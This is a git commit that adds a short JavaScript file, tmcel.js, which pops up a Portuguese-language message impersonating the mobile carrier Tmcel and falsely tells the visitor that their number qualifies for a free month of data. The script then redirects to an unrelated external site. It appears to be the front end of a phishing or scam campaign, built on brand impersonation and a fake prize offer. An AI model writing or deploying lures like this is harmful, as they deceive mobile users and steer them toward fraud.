c9e6feaaec995e93c7986395e5c1d96e483e3a3c
newetijazz22 <newetijazz22@gmail.com>
2026-02-07 07:08:56 +0100

    Create tmcel.js

---
+++ tmcel.js
@@ -0,0 +1,5 @@
+var password = 'ATIVE 1 MÊS DE DADOS GRÁTIS'
+password=prompt('Tmcel: Parabéns! Seu número de celular está qualificado para receber 1 mês de dados grátis. Clique em OK para ativar agora.','ATIVE 1 MÊS DE DADOS GRÁTIS');
+if (password != 'ATIVE 1 MÊS DE DADOS GRÁTIS') {
+location.href='https://www.vrhmfed.site/tmcel';
+}
